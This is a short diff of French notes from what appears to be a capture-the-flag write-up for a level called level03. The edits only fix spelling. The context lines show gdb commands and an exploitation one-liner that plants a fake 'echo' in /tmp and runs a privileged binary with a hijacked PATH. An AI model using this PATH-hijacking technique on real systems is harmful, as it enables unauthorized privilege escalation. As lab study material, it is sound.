@@ -12,9 +12,9 @@ file -s level03
     dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x3bee584f790153856e826e38544b9e80ac184b7b, not stripped
     On va exploiter le fichier avec gdb
 
-- gdb: break le binaire pour trouver les infos qui nous interesse
+- gdb: break le binaire pour trouver les infos qui nous intéressent
 gdb ./level03; set disassemble-flavor intel; break *main; disassemble; x/s hexa
-    -> Exploit me est afficher par un echo mais appele depuis un env
+    -> Exploit me est affiché par un echo, mais appelle depuis un env
 
 - exploitation:
 echo getflag > /tmp/echo; chmod 777 /tmp/echo; PATH=/tmp:usr/bin ./level03
